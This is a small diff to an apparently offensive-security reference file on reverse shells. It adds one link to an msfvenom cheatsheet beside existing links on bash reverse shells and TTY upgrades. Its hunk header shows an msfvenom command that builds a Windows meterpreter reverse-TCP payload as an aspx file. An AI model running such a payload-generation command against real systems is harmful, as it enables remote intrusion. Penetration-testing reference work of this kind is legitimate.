@@ -70,3 +70,4 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > sh
 - [Reverse shell with bash](http://web.archive.org/web/20180625050916/http://www.gnucitizen.org/blog/reverse-shell-with-bash/)
 - [The TTY demystified](http://www.linusakesson.net/programming/tty/)
 - [Upgrading simple shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
+- [msfvenom cheatsheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
